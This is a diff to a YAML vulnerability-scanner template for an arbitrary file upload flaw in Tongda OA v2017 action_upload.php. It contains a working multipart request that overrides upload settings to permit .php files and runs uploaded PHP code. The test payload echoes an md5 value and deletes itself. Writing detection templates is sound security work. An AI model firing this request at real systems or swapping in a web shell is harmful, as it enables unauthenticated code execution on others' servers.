@@ -4,7 +4,7 @@ info:
   name: 通达OA v2017 action_upload.php 任意文件上传漏洞
   author: zan8in
   severity: critical
-  verified: false
+  verified: true
   description: |
     通达OA v2017 action_upload.php 文件过滤不足且无需后台权限，导致任意文件上传漏洞
     app="TDXK-通达OA"
@@ -12,16 +12,16 @@ info:
     - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2017%20action_upload.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
 
 set:
-    rand1: randomLowercase(12)
-    md5str: md5(rand1)
-    rboundary: randomLowercase(8)
+  randstr: randomLowercase(6)
+  num: randomInt(1000, 10000)
+  rboundary: randomLowercase(8)
 rules:
   r0:
     request:
       method: POST
       path: /module/ueditor/php/action_upload.php?action=uploadfile
       headers:
-          Content-Type: multipart/form-data; boundary=----------WebKitFormBoundary{{rboundary}}
+        Content-Type: multipart/form-data; boundary=----------WebKitFormBoundary{{rboundary}}
       body: "\
         ------------WebKitFormBoundary{{rboundary}}\r\n\
         Content-Disposition: form-data; name=\"CONFIG[fileFieldName]\"\r\n\
@@ -34,26 +34,26 @@ rules:
         ------------WebKitFormBoundary{{rboundary}}\r\n\
         Content-Disposition: form-data; name=\"CONFIG[filePathFormat]\"\r\n\
         \r\n\
-        tcmd\r\n\
+        {{randstr}}\r\n\
         ------------WebKitFormBoundary{{rboundary}}\r\n\
         Content-Disposition: form-data; name=\"CONFIG[fileAllowFiles][]\"\r\n\
         \r\n\
         .php\r\n\
         ------------WebKitFormBoundary{{rboundary}}\r\n\
-        Content-Disposition: form-data; name=\"ffff\"; filename=\"{{rand1}}.php\"\r\n\
+        Content-Disposition: form-data; name=\"ffff\"; filename=\"test.php\"\r\n\
         Content-Type: application/octet-stream\r\n\
         \r\n\
-        <?php phpinfo();?>\r\n\
+        <?php echo md5({{num}});unlink(__FILE__);?>\r\n\
         ------------WebKitFormBoundary{{rboundary}}\r\n\
         Content-Disposition: form-data; name=\"mufile\"\r\n\
         \r\n\
         submit\r\n\
         ------------WebKitFormBoundary{{rboundary}}--\r\n\
         "
-      expression: response.status == 200
-  r1: 
+    expression: response.status == 200
+  r1:
     request:
       method: GET
-      path: /{{rand1}}.php
-    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+      path: /{{randstr}}.php
+    expression: response.status == 200 && response.body.bcontains(bytes(md5(string(num))))
 expression: r0() && r1()
